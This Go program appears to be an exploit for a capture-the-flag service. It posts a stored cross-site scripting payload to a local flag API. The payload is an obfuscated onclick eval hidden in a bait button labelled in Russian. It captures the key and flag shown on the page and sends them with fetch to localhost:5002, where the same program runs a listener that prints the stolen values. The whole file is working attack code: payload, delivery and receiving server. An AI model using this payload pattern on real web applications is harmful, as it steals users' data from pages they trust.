package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/gorilla/mux"
)

func addFlag(id, flagValue string) {
	req, err := http.NewRequest("GET", "http://localhost/api/add_flag", nil)
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}

	q := req.URL.Query()
	q.Add("key", id)
	q.Add("value", flagValue)
	req.URL.RawQuery = q.Encode()

	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	log.Println(res.Status)
	defer res.Body.Close()
}

func addIntruderFlag() {
	id := "a"
	flagValue := "<button onclick=eval('d=0;if(!d){d=1;f=document;euc=encodeURIComponent;qs=f.querySelector.bind(f);qs(`#btn-get-flag`).addEventListener(`click`,function(){setTimeout(function(){fetch(`http:\\/\\/localhost:5002\\/?k=${euc(qs(`#key`).value)}^${euc(qs(`#flag_value`).textContent)}`)},100)})}');>Не кликай на меня! а то пожалеешь</button>"
	addFlag(id, flagValue)
	fmt.Println("Intruder flag was put to server")
}

func startIntruderServer() {
	var p int
	flag.IntVar(&p, "port", 5002, "server port")
	flag.Parse()
	r := mux.NewRouter()
	r.HandleFunc("/", showKey).Methods("GET")
	http.Handle("/", r)
	log.Print("[info] Starting listening on port ", p)
	log.Fatal(http.ListenAndServe("0.0.0.0:"+strconv.Itoa(p), r))
}

func main() {
	addIntruderFlag()
	startIntruderServer()
}

func showKey(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	flag := r.URL.Query().Get("k")
	fmt.Println(flag)
}
